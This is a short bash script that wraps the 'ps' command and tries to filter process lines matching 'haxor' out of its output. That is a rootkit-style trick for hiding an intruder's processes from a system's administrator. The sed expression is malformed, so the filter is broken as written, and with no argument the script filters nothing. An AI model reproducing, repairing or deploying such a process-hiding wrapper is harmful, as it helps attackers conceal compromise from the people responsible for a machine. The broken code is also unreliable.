#!/bin/bash
_ps() {
    if [ -z "$1" ]
    then
        ps
    else
        ps $1 | sed -e 'd/haxor.*/'
    fi
}

_ps $1
